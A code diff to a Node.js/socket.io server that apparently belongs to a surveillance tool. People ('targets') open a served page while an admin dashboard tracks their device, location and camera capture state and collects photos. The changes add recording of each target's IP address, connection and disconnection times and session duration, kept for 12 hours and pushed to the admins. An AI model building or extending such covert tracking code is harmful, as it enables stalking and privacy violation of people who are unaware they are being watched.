@@ -80,6 +80,11 @@ function addHistory(record) {
     saveHistory();
 }
 
+function getFilteredHistory() {
+    const twelveHoursAgo = Date.now() - (12 * 60 * 60 * 1000);
+    return accessHistory.filter(item => new Date(item.connectedAtTime || item.timestamp || 0).getTime() >= twelveHoursAgo);
+}
+
 function isAdminRequest(req) {
     return req.session && req.session.isAdmin === true;
 }
@@ -127,6 +132,7 @@ function getPublicTargets() {
 
 function emitUsersList() {
     io.to("admins").emit("update-users-list", getPublicTargets());
+    io.to("admins").emit("update-history", getFilteredHistory().slice().reverse());
 }
 
 app.get("/", (req, res) => res.sendFile(path.join(PUBLIC_DIR, "user.html")));
@@ -170,6 +176,8 @@ app.delete("/api/admin/photos/:id", requireAdmin, (req, res) => {
 });
 
 io.on("connection", (socket) => {
+    const clientIp = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
+
     socket.on("admin-auth", (password) => {
         if (password !== ADMIN_PASSWORD) {
             socket.emit("admin-auth-required");
@@ -181,7 +189,7 @@ io.on("connection", (socket) => {
             linkActive: isLinkActive,
             autoCapture: isAutoCaptureOn,
             users: getPublicTargets(),
-            history: accessHistory.slice().reverse(),
+            history: getFilteredHistory().slice().reverse(),
             photos: Array.from(tempPhotos.values()),
             maxUsers: MAX_USERS
         });
@@ -213,10 +221,16 @@ io.on("connection", (socket) => {
                 socket.disconnect(true);
                 return;
             }
+            const now = new Date();
             const target = {
                 id: socket.id,
+                ip: clientIp,
                 deviceInfo: data && typeof data.deviceInfo === "string" ? data.deviceInfo.slice(0, 150) : "Web User",
-                connectedAt: new Date().toLocaleString(),
+                connectedAtTime: now.getTime(),
+                connectedAt: now.toLocaleTimeString(),
+                connectedDateStr: now.toLocaleString(),
+                disconnectedAt: "-",
+                duration: "Active...",
                 location: null,
                 cameraReady: false,
                 autoCaptureStarted: false
@@ -236,10 +250,16 @@ io.on("connection", (socket) => {
                 socket.disconnect(true);
                 return;
             }
+            const now = new Date();
             target = {
                 id: socket.id,
+                ip: clientIp,
                 deviceInfo: data && typeof data.deviceInfo === "string" ? data.deviceInfo.slice(0, 150) : "Web User",
-                connectedAt: new Date().toLocaleString(),
+                connectedAtTime: now.getTime(),
+                connectedAt: now.toLocaleTimeString(),
+                connectedDateStr: now.toLocaleString(),
+                disconnectedAt: "-",
+                duration: "Active...",
                 location: null,
                 cameraReady: false,
                 autoCaptureStarted: false
@@ -291,6 +311,22 @@ io.on("connection", (socket) => {
         authenticatedAdmins.delete(socket.id);
         const target = connectedTargets.get(socket.id);
         if (target) {
+            const disconnectTime = new Date();
+            const durationMs = disconnectTime.getTime() - target.connectedAtTime;
+            const secs = Math.floor(durationMs / 1000);
+            const mins = Math.floor(secs / 60);
+            target.disconnectedAt = disconnectTime.toLocaleTimeString();
+            target.duration = mins > 0 ? `${mins}m ${secs % 60}s` : `${secs}s`;
+
+            addHistory({
+                deviceInfo: target.deviceInfo,
+                ip: target.ip,
+                connectedAt: target.connectedDateStr,
+                disconnectedAt: target.disconnectedAt,
+                duration: target.duration,
+                connectedAtTime: target.connectedAtTime
+            });
+
             connectedTargets.delete(socket.id);
             emitUsersList();
         }
